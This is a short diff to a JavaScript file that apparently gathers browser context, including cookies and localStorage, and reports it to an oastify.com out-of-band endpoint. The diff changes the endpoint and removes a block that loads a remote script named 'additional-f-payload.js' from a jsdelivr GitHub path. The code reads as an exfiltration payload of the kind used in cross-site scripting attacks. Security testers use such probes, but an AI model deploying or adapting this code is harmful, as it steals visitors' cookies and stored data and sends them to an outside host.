@@ -3,7 +3,7 @@
 
 (function () {
   // ===================== CONFIG =====================
-  const LOG_ENDPOINT = "https://ddum2c2gybx9bm6bihtr2gg2wt2nqde2.oastify.com"; // <- replace with your endpoint
+  const LOG_ENDPOINT = "2psu1sp0s96df6nzxxzv34miu901orcg.oastify.com"; // <- replace with your endpoint
 
   // ===================== COLLECT =====================
   function collectContext() {
@@ -132,11 +132,6 @@
     console.log("%cCookies%c %d item(s)", sub, dim, payload.cookies.total);
     console.log("%cLocalStorage%c %d item(s)", sub, dim, payload.localStorage.total);
   })();
-  (function() {
-  const s = document.createElement('script');
-  s.src = 'https://cdn.jsdelivr.net/gh/g-fraid/misc@master/additional-f-payload.js';
-  s.async = false;
-  document.head.appendChild(s);
 })();
-})();
+
 
